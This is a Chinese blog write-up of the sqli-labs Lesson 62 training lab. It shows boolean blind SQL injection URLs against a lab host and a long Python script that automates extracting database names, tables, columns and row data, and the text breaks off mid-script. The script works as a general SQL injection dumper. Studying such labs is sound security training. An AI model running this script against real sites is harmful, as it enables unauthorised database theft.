@@ -1,0 +1,866 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
+    <meta charset="UTF-8" /><meta name="theme-color" content="#fff" />
+
+    
+        
+        
+        <script>
+            if (window.location.host == "www.yingyingguaier.top" && window.location.protocol != "https:") {
+                window.location.protocol = "https";
+            }
+        </script>
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes" />
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+    
+    <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
+    
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+    
+    <meta name="renderer" content="webkit" />
+
+    <meta name="generator" content="Hugo 0.60.1" />
+
+    <title>sqli-labs lession-62 GET-盲注-变化1-仅允许130次请求 | 柠萌C×篝火</title>
+
+    <link rel="stylesheet" href="/css/meme.min.f217594b2f7c00d93e5d9715a54f552875743a60d7b879b784b739465ad735b0.css" integrity="sha256-8hdZSy98ANk+XZcVpU9VKHV0OmDXuHm3hLc5RlrXNbA=" data-instant-track />
+
+    <link href="https://fonts.googleapis.com/css?family=EB+Garamond|Long+Cang|Noto+Serif+SC|Shadows+Into+Light|ZCOOL+XiaoWei&display=swap&subset=chinese-simplified" rel="stylesheet" />
+
+    <meta name="author" content="0menc" />
+    
+    
+    <meta name="description" content="注入 http://10.60.17.35:8082/Less-62/?id=1&#39;)&#43;and&#43;1=1%23 http://10.60.17.35:8082/Less-62/?id=1&#39;)&#43;and&#43;1=2%23 构造闭合方式为表现不同,表现为布尔型注入。 可以使用脚本代替手工测试。 获取当前……" />
+    <meta name="keywords" content="渗透测试, 靶场, sql注入, sqli-labs, others" />
+    
+    <link rel="shortcut icon" type="image/ico" href="/favicon.ico" />
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg" color="#2a6df4" />
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-title" content="柠萌C×篝火" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+    <meta name="mobile-web-app-capable" content="yes" />
+    <meta name="application-name" content="柠萌C×篝火" />
+    <meta name="msapplication-starturl" content="../../" />
+    <meta name="msapplication-TileColor" content="#fff" />
+    <meta name="msapplication-TileImage" content="../../icons/mstile-150x150.png" />
+    <link rel="manifest" href="/manifest.json" />
+
+    
+    
+
+    
+    <link rel="canonical" href="https://www.yingyingguaier.top/others/sqli-labs-lession-62-get-%E7%9B%B2%E6%B3%A8-%E5%8F%98%E5%8C%961-%E4%BB%85%E5%85%81%E8%AE%B8130%E6%AC%A1%E8%AF%B7%E6%B1%82/" />
+
+
+
+
+<script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "BlogPosting",
+        "datePublished": "2018-11-29T14:05:15+08:00",
+        "dateModified": "2020-01-25T23:51:33+08:00",
+        "url": "https://www.yingyingguaier.top/others/sqli-labs-lession-62-get-%E7%9B%B2%E6%B3%A8-%E5%8F%98%E5%8C%961-%E4%BB%85%E5%85%81%E8%AE%B8130%E6%AC%A1%E8%AF%B7%E6%B1%82/",
+        "headline": "sqli-labs lession-62 GET-盲注-变化1-仅允许130次请求",
+        "description": "注入 http://10.60.17.35:8082/Less-62/?id=1')+and+1=1%23 http://10.60.17.35:8082/Less-62/?id=1')+and+1=2%23 构造闭合方式为表现不同,表现为布尔型注入。 可以使用脚本代替手工测试。 获取当前……",
+        "keywords": "渗透测试, 靶场, sql注入, sqli-labs, others",
+        "inLanguage" : "zh-CN",
+        "articleSection": "Others",
+        "wordCount":  1763 ,
+        "image": ["https://www.yingyingguaier.top/images/SQLI-labs/Lesson-62/001.png","https://www.yingyingguaier.top/images/SQLI-labs/Lesson-62/002.png","https://www.yingyingguaier.top/images/SQLI-labs/Lesson-62/003.png","https://www.yingyingguaier.top/images/SQLI-labs/Lesson-62/004.png","https://www.yingyingguaier.top/images/SQLI-labs/Lesson-62/005.png"],
+        "author": {
+            "@type": "Person",
+            "description": "motto",
+            "email": "fastmast.fm@gmail.com",
+            "image": "https://www.yingyingguaier.top/icons/apple-touch-icon.png",
+            "url": "https://www.yingyingguaier.top/",
+            "name": "0menc"
+        },
+        "license": "在保留本文作者及本文链接的前提下，非商业用途随意转载分享。",
+        "publisher": {
+            "@type": "Organization",
+            "name": "柠萌C×篝火",
+            "logo": {
+                "@type": "ImageObject",
+                "url": "https://www.yingyingguaier.top/icons/apple-touch-icon.png"
+            },
+            "url": "https://www.yingyingguaier.top/"
+        },
+        "mainEntityOfPage": {
+            "@type": "WebSite",
+            "@id": "https://www.yingyingguaier.top/"
+        }
+    }
+</script>
+
+    
+
+
+
+<meta name="twitter:card" content="summary_large_image" />
+
+
+<meta name="twitter:site" content="@0menc" />
+<meta name="twitter:creator" content="@0menc" />
+
+    
+
+
+
+
+
+
+<meta property="og:title" content="sqli-labs lession-62 GET-盲注-变化1-仅允许130次请求" />
+<meta property="og:description" content="注入 http://10.60.17.35:8082/Less-62/?id=1&#39;)&#43;and&#43;1=1%23 http://10.60.17.35:8082/Less-62/?id=1&#39;)&#43;and&#43;1=2%23 构造闭合方式为表现不同,表现为布尔型注入。 可以使用脚本代替手工测试。 获取当前……" />
+<meta property="og:url" content="https://www.yingyingguaier.top/others/sqli-labs-lession-62-get-%E7%9B%B2%E6%B3%A8-%E5%8F%98%E5%8C%961-%E4%BB%85%E5%85%81%E8%AE%B8130%E6%AC%A1%E8%AF%B7%E6%B1%82/" />
+<meta property="og:site_name" content="柠萌C×篝火" />
+<meta property="og:locale" content="zh-CN" /><meta property="og:image" content="https://www.yingyingguaier.top/images/SQLI-labs/Lesson-62/001.png" />
+<meta property="og:type" content="article" />
+    <meta property="article:published_time" content="2018-11-29T14:05:15+08:00" />
+    <meta property="article:modified_time" content="2020-01-25T23:51:33+08:00" />
+    
+    <meta property="article:section" content="Others" />
+    <meta property="article:tag" content="渗透测试, 靶场, sql注入, sqli-labs, others" />
+
+        
+
+
+    
+    <script async src="https://www.googletagmanager.com/gtag/js?id="></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', '');
+    </script>
+
+
+
+
+    
+</head>
+
+    <body>
+        <div class="container">
+            
+    <header class="header">
+        <div class="site-brand">
+            
+            <a href="/" class="brand">柠萌C×篝火</a>
+            
+        </div>
+    </header>
+
+
+            
+    <nav class="nav">
+        <ul class="menu" id="menu">
+            
+                
+            
+            
+            
+                <li class="menu-item"><a href="/"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" class="icon menu-item-icon"><path d="M280.37 148.26L96 300.11V464a16 16 0 0 0 16 16l112.06-.29a16 16 0 0 0 15.92-16V368a16 16 0 0 1 16-16h64a16 16 0 0 1 16 16v95.64a16 16 0 0 0 16 16.05L464 480a16 16 0 0 0 16-16V300L295.67 148.26a12.19 12.19 0 0 0-15.3 0zM571.6 251.47L488 182.56V44.05a12 12 0 0 0-12-12h-56a12 12 0 0 0-12 12v72.61L318.47 43a48 48 0 0 0-61 0L4.34 251.47a12 12 0 0 0-1.6 16.9l25.5 31A12 12 0 0 0 45.15 301l235.22-193.74a12.19 12.19 0 0 1 15.3 0L530.9 301a12 12 0 0 0 16.9-1.6l25.5-31a12 12 0 0 0-1.7-16.93z"/></svg><span class="menu-item-name">首页</span></a>
+                </li>
+            
+                <li class="menu-item active"><a href="/others/"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon menu-item-icon"><path d="M32 448c0 17.7 14.3 32 32 32h384c17.7 0 32-14.3 32-32V160H32v288zm160-212c0-6.6 5.4-12 12-12h104c6.6 0 12 5.4 12 12v8c0 6.6-5.4 12-12 12H204c-6.6 0-12-5.4-12-12v-8zM480 32H32C14.3 32 0 46.3 0 64v48c0 8.8 7.2 16 16 16h480c8.8 0 16-7.2 16-16V64c0-17.7-14.3-32-32-32z"/></svg><span class="menu-item-name">文章</span></a>
+                </li>
+            
+                <li class="menu-item"><a href="/categories/"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon menu-item-icon"><path d="M149.333 56v80c0 13.255-10.745 24-24 24H24c-13.255 0-24-10.745-24-24V56c0-13.255 10.745-24 24-24h101.333c13.255 0 24 10.745 24 24zm181.334 240v-80c0-13.255-10.745-24-24-24H205.333c-13.255 0-24 10.745-24 24v80c0 13.255 10.745 24 24 24h101.333c13.256 0 24.001-10.745 24.001-24zm32-240v80c0 13.255 10.745 24 24 24H488c13.255 0 24-10.745 24-24V56c0-13.255-10.745-24-24-24H386.667c-13.255 0-24 10.745-24 24zm-32 80V56c0-13.255-10.745-24-24-24H205.333c-13.255 0-24 10.745-24 24v80c0 13.255 10.745 24 24 24h101.333c13.256 0 24.001-10.745 24.001-24zm-205.334 56H24c-13.255 0-24 10.745-24 24v80c0 13.255 10.745 24 24 24h101.333c13.255 0 24-10.745 24-24v-80c0-13.255-10.745-24-24-24zM0 376v80c0 13.255 10.745 24 24 24h101.333c13.255 0 24-10.745 24-24v-80c0-13.255-10.745-24-24-24H24c-13.255 0-24 10.745-24 24zm386.667-56H488c13.255 0 24-10.745 24-24v-80c0-13.255-10.745-24-24-24H386.667c-13.255 0-24 10.745-24 24v80c0 13.255 10.745 24 24 24zm0 160H488c13.255 0 24-10.745 24-24v-80c0-13.255-10.745-24-24-24H386.667c-13.255 0-24 10.745-24 24v80c0 13.255 10.745 24 24 24zM181.333 376v80c0 13.255 10.745 24 24 24h101.333c13.255 0 24-10.745 24-24v-80c0-13.255-10.745-24-24-24H205.333c-13.255 0-24 10.745-24 24z"/></svg><span class="menu-item-name">分类</span></a>
+                </li>
+            
+                <li class="menu-item"><a href="/tags/"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512" class="icon menu-item-icon"><path d="M497.941 225.941L286.059 14.059A48 48 0 0 0 252.118 0H48C21.49 0 0 21.49 0 48v204.118a48 48 0 0 0 14.059 33.941l211.882 211.882c18.744 18.745 49.136 18.746 67.882 0l204.118-204.118c18.745-18.745 18.745-49.137 0-67.882zM112 160c-26.51 0-48-21.49-48-48s21.49-48 48-48 48 21.49 48 48-21.49 48-48 48zm513.941 133.823L421.823 497.941c-18.745 18.745-49.137 18.745-67.882 0l-.36-.36L527.64 323.522c16.999-16.999 26.36-39.6 26.36-63.64s-9.362-46.641-26.36-63.64L331.397 0h48.721a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882z"/></svg><span class="menu-item-name">标签</span></a>
+                </li>
+            
+                <li class="menu-item"><a href="/about/"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" class="icon menu-item-icon"><path d="M248 8C111 8 0 119 0 256s111 248 248 248 248-111 248-248S385 8 248 8zm0 96c48.6 0 88 39.4 88 88s-39.4 88-88 88-88-39.4-88-88 39.4-88 88-88zm0 344c-58.7 0-111.3-26.6-146.5-68.2 18.8-35.4 55.6-59.8 98.5-59.8 2.4 0 4.8.4 7.1 1.1 13 4.2 26.6 6.9 40.9 6.9 14.3 0 28-2.7 40.9-6.9 2.3-.7 4.7-1.1 7.1-1.1 42.9 0 79.7 24.4 98.5 59.8C359.3 421.4 306.7 448 248 448z"/></svg><span class="menu-item-name">关于</span></a>
+                </li>
+            
+        </ul>
+    </nav>
+
+            
+            
+            
+    <main class="main single" id="main">
+    <div class="main-inner">
+
+        <article class="content post" data-align="justify" data-type="Others">
+
+            <h1 class="post-title">sqli-labs lession-62 GET-盲注-变化1-仅允许130次请求</h1>
+
+            
+
+            
+                
+            
+
+            
+                
+
+<div class="post-meta">
+    
+        
+        <time datetime="2018-11-29T14:05:15+08:00" class="post-meta-item published"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M148 288h-40c-6.6 0-12-5.4-12-12v-40c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v40c0 6.6-5.4 12-12 12zm108-12v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm96 0v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm-96 96v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm-96 0v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm192 0v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm96-260v352c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V112c0-26.5 21.5-48 48-48h48V12c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v52h128V12c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v52h48c26.5 0 48 21.5 48 48zm-48 346V160H48v298c0 3.3 2.7 6 6 6h340c3.3 0 6-2.7 6-6z"/></svg>&nbsp;2018-11-29</time>
+    
+    
+    
+    
+        
+        
+            
+            
+                
+                
+                
+                
+                    
+                    
+                    
+                        
+                            
+                            
+                        
+                    
+                
+            
+            
+            
+                
+                <span class="post-meta-item category"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M464 128H272l-54.63-54.63c-6-6-14.14-9.37-22.63-9.37H48C21.49 64 0 85.49 0 112v288c0 26.51 21.49 48 48 48h416c26.51 0 48-21.49 48-48V176c0-26.51-21.49-48-48-48zm0 272H48V112h140.12l54.63 54.63c6 6 14.14 9.37 22.63 9.37H464v224z"/></svg>&nbsp;<a href="/others/" class="category-link">Others</a></span>
+            
+        
+        
+    
+    
+        
+        <span class="post-meta-item wordcount"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M497.9 142.1l-46.1 46.1c-4.7 4.7-12.3 4.7-17 0l-111-111c-4.7-4.7-4.7-12.3 0-17l46.1-46.1c18.7-18.7 49.1-18.7 67.9 0l60.1 60.1c18.8 18.7 18.8 49.1 0 67.9zM284.2 99.8L21.6 362.4.4 483.9c-2.9 16.4 11.4 30.6 27.8 27.8l121.5-21.3 262.6-262.6c4.7-4.7 4.7-12.3 0-17l-111-111c-4.8-4.7-12.4-4.7-17.1 0zM124.1 339.9c-5.5-5.5-5.5-14.3 0-19.8l154-154c5.5-5.5 14.3-5.5 19.8 0s5.5 14.3 0 19.8l-154 154c-5.5 5.5-14.3 5.5-19.8 0zM88 424h48v36.3l-64.5 11.3-31.1-31.1L51.7 376H88v48z"/></svg>&nbsp;1763</span>
+    
+    
+        
+        <span class="post-meta-item reading-time"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"/></svg>&nbsp;4&nbsp;分钟</span>
+    
+    
+</div>
+            
+
+            <div class="post-body"><h2 id="heading"><a href="#heading" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>注入</h2>
+<p><code>http://10.60.17.35:8082/Less-62/?id=1')+and+1=1%23</code></p>
+<p><code>http://10.60.17.35:8082/Less-62/?id=1')+and+1=2%23</code></p>
+<p>构造闭合方式为表现不同,表现为布尔型注入。</p>
+<p>可以使用脚本代替手工测试。</p>
+<p>获取当前数据库名</p>
+<p><img src="/images/SQLI-labs/Lesson-62/001.png" alt="001" data-zoomable></p>
+<p>获取表名</p>
+<p><img src="/images/SQLI-labs/Lesson-62/002.png" alt="002" data-zoomable></p>
+<p>获取列名</p>
+<p><img src="/images/SQLI-labs/Lesson-62/003.png" alt="003" data-zoomable></p>
+<p>获取秘钥</p>
+<p><img src="/images/SQLI-labs/Lesson-62/004.png" alt="004" data-zoomable></p>
+<p>成功。</p>
+<p><img src="/images/SQLI-labs/Lesson-62/005.png" alt="005" data-zoomable></p>
+<p>但是使用无论是脚本还是手注都会遇到一个问题,单个字符的猜解平均达到到8次请求,对脚本里用的取与法来说是正常的,但是在只能130次的情况下超出太多了,完整的一次流程达到630左右....</p>
+<h2 id="heading1"><a href="#heading1" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>测试脚本</h2>
+<pre><code>#python3
+import requests
+import re
+import threading
+from optparse import OptionParser
+
+feature = 'Your Login name'
+head = &quot;')&quot;
+headers = {
+    'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0'}
+
+
+def getpayload(url, payload):
+    return url + payload
+
+
+def binary_search_db(url, payload):
+    i = 1
+    s = &quot;&quot;
+    while 1:
+        count = 0
+        mid = 0
+        low = 47
+        high = 57
+        while low &lt;= high:
+            mid = int((low + high) / 2)
+            newpayload = payload % (i, mid)
+            html = requests.get(getpayload(url, newpayload),
+                                headers=headers).text
+            if feature in html:
+                low = mid + 1
+                count += 1
+            else:
+                high = mid - 1
+        if count != 0:
+            s = s + chr(int((low + high + 1) / 2))
+            i = i + 1
+        else:
+            break
+    return int(s)
+
+# 获取当前数据库长度
+
+
+def get_db_len(url):
+    payload = head + \
+        &quot; AND ORD(MID((SELECT LENGTH(database())),%d,1))&gt;%d--+&quot;
+    lenth = binary_search_db(url, payload)
+    print('[+]当前数据库长度: %d' % lenth)
+    return lenth
+
+# 获取当前数据库名
+
+
+def get_cu_db_name(url):
+    lenth = get_db_len(url)
+    dbname = &quot;&quot;
+    for i in range(lenth):
+        payload = head + \
+            &quot; and ascii(substr((select database()),%d,1))&quot; % (i + 1)
+        dbname += and_method(url, payload)
+        print('[-]当前猜解', dbname)
+    print('[*]', dbname)
+
+
+def getdbnum(url):
+    num = 0
+    payload = head + \
+        &quot; AND ORD(MID((SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),%d,1))&gt;%d--+&quot;
+    num = binary_search_db(url, payload)
+    print('[+]数据库数 [%d]' % num)
+    return num
+
+
+def get_all_db_len(url, num):
+    thread = []
+    key = []
+    th = []
+    lenth = []
+    for i in range(num):
+        payload = head + \
+            &quot; AND ORD(MID((SELECT IFNULL(CAST(LENGTH(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA limit i,1),%d,1))&gt;%d--+&quot;
+        payload = re.sub(r'\bi\b', str(i), payload)
+        key.append(payload)
+
+    def run_thread(stri, i):
+        s = &quot;db&quot; + str(i) + &quot;:&quot; + str(binary_search_db(url, stri))
+        # print(s)
+        th.append(s)
+
+    for i in range(num):
+        t = threading.Thread(target=run_thread,
+                             args=(key[i], i,))
+        thread.append(t)
+        thread[i].start()
+
+    for i in range(num):
+        thread[i].join()
+    th.sort()
+    for i in th:
+        i = re.sub(r'db\d+\:', '', i)
+        lenth.append(i)
+    return lenth
+
+# 取与法
+
+
+def and_method(url, payload):
+    two = [1, 2, 4, 8, 16, 32, 64, 128]
+    s = 0
+    keys = []
+    thread = []
+    m = []
+
+    def run_thread(url, i, s):
+        html = requests.get(url, headers=headers).text
+        if feature in html:
+            s = s | two[i]
+            m.append(s)
+
+    for i in range(8):
+        newpayload = &quot;&quot;
+        newpayload = payload + &quot;%26&quot; + &quot;%d=%d--+&quot; % (two[i], two[i])
+        keys.append(newpayload)
+
+    for i in range(8):
+        t = threading.Thread(target=run_thread, args=(
+            getpayload(url, keys[i]), i, s,))
+        thread.append(t)
+
+    for t in thread:
+        t.start()
+    for t in thread:
+        t.join()
+
+    for i in m:
+        s = s | i
+    return chr(s)
+
+
+def getdbname(url):
+    num = getdbnum(url)
+    lenth = get_all_db_len(url, num)
+    dbs = []
+
+    for i in range(int(len(lenth))):
+        dbname = &quot;&quot;
+        for j in range(1, int(lenth[i]) + 1):
+            payload = head + &quot; and ascii(substr((select schema_name from information_schema.schemata limit %d,1),%d,1))&quot; % (
+                i, j)
+            dbname += and_method(url, payload)
+            print('[-]当前猜解', dbname)
+        print(dbname)
+        dbs.append(dbname)
+    print('available databases [%s]' % num)
+    for db in dbs:
+        print('[*]', db)
+
+
+def get_table_num(url, dbname):
+    num = 0
+    payload = head + \
+        &quot; AND ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s'),&quot; % dbname
+    payload += &quot;%d,1))&gt;%d--+&quot;
+    # print(payload)
+    num = binary_search_db(url, payload)
+    print('[+]数据表数 [%d]' % num)
+    return num
+
+
+def get_all_table_len(url, num, dbname):
+    thread = []
+    key = []
+    th = []
+    lenth = []
+    for i in range(num):
+        payload = head + \
+            &quot; AND ORD(MID((SELECT IFNULL(CAST(LENGTH(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s' limit i,1),&quot; % dbname
+        payload += &quot;%d,1))&gt;%d--+&quot;
+        payload = re.sub(r'\bi\b', str(i), payload)
+        key.append(payload)
+
+    def run_thread(stri, i):
+        s = &quot;db&quot; + str(i) + &quot;:&quot; + str(binary_search_db(url, stri))
+        # print(s)
+        th.append(s)
+
+    for i in range(num):
+        t = threading.Thread(target=run_thread,
+                             args=(key[i], i,))
+        thread.append(t)
+        thread[i].start()
+
+    for i in range(num):
+        thread[i].join()
+    th.sort()
+    for i in th:
+        i = re.sub(r'db\d+\:', '', i)
+        lenth.append(i)
+    return lenth
+
+
+def get_table_name(url, dbname):
+    num = get_table_num(url, dbname)
+    lenth = get_all_table_len(url, num, dbname)
+    tables = []
+
+    for i in range(int(len(lenth))):
+        tbname = &quot;&quot;
+        for j in range(1, int(lenth[i]) + 1):
+            payload = head + \
+                &quot; and ascii(substr((select table_name from information_schema.tables WHERE TABLE_SCHEMA='%s' limit&quot; % dbname
+            payload += &quot; %d,1),%d,1))&quot; % (i, j)
+            tbname += and_method(url, payload)
+            print('[-]当前猜解', tbname)
+        print(tbname)
+        tables.append(tbname)
+    print('Database: %s' % dbname)
+    print('[%d tables]' % num)
+    for table in tables:
+        print('[*]', table)
+
+# 获取列数
+
+
+def get_column_num(url, tbname, dbname):
+    num = 0
+    payload = head + &quot; AND ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s'),&quot; % (
+        tbname, dbname)
+    payload += &quot;%d,1))&gt;%d--+&quot;
+    num = binary_search_db(url, payload)
+    print('[+]列数 [%d]' % num)
+    return num
+
+# 获取列长度
+
+
+def get_all_columns_len(url, num, tbname, dbname):
+    thread = []
+    key = []
+    th = []
+    lenth = []
+    for i in range(num):
+        payload = head + &quot; AND ORD(MID((SELECT IFNULL(CAST(LENGTH(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s' limit i,1),&quot; % (
+            tbname, dbname)
+        payload += &quot;%d,1))&gt;%d--+&quot;
+        payload = re.sub(r'\bi\b', str(i), payload)
+        key.append(payload)
+
+    def run_thread(stri, i):
+        s = &quot;co&quot; + str(i) + &quot;:&quot; + str(binary_search_db(url, stri))
+        # print(s)
+        th.append(s)
+
+    for i in range(num):
+        t = threading.Thread(target=run_thread,
+                             args=(key[i], i,))
+        thread.append(t)
+        thread[i].start()
+
+    for i in range(num):
+        thread[i].join()
+    th.sort()
+    for i in th:
+        i = re.sub(r'co\d+\:', '', i)
+        lenth.append(i)
+    return lenth
+
+# 获取列名
+
+
+def get_column_name(url, tbname, dbname):
+    num = get_column_num(url, tbname, dbname)
+    lenth = get_all_columns_len(url, num, tbname, dbname)
+    columns = []
+
+    for i in range(int(len(lenth))):
+        coname = &quot;&quot;
+        for j in range(1, int(lenth[i]) + 1):
+            payload = head + &quot; and ascii(substr((select column_name from information_schema.columns where table_name='%s' and table_schema='%s' limit&quot; % (
+                tbname, dbname)
+            payload += &quot; %d,1),%d,1))&quot; % (i, j)
+            coname += and_method(url, payload)
+            print('[-]当前猜解', coname)
+        print(coname)
+        columns.append(coname)
+    print('Database: %s' % dbname)
+    print('Table: %s' % tbname)
+    print('[%d columns]' % num)
+    for column in columns:
+        print('[*]', column)
+    return columns
+
+# 获取字段数
+
+
+def get_data_num(url, tbname, dbname):
+    num = 0
+    payload = head + \
+        &quot; AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM %s.%s),&quot; % (dbname, tbname)
+    payload += &quot; %d,1))&gt;%d--+&quot;
+    num = binary_search_db(url, payload)
+    print('[+]字段数 [%d]' % num)
+    return num
+
+# 获取字段长度
+
+
+def get_data_len(url, coname, tbname, dbname, i):
+    payload = head + &quot; AND ORD(MID((SELECT IFNULL(CAST(LENGTH(%s) AS CHAR),0x20) FROM %s.%s limit %d,1),&quot; % (
+        coname, dbname, tbname, i)
+    payload += &quot; %d,1))&gt;%d--+&quot;
+    lenth = binary_search_db(url, payload)
+    print('[+]当前字段`%s`长度: %d' % (coname, lenth))
+    return lenth
+
+# 获取字段值
+
+
+def get_data(url, coname, tbname, dbname, count):
+    lenth = get_data_len(url, coname, tbname, dbname, count)
+    data = &quot;&quot;
+    for i in range(lenth):
+        payload = head + &quot; and ascii(substr((select %s from %s.%s limit %d,1),%d,1))&quot; % (
+            coname, dbname, tbname, count, i + 1)
+        data += and_method(url, payload)
+        print('[-]当前猜解', data)
+    print(data)
+    return data
+
+
+def dump(url, tbname, dbname, coname=None):
+    num = get_data_num(url, tbname, dbname)
+    if coname is None:
+        columns = get_column_name(url, tbname, dbname)
+    else:
+        columns = coname.split(&quot;,&quot;)
+    print(columns)
+    datas = []
+    for i in range(num):
+        for column in columns:
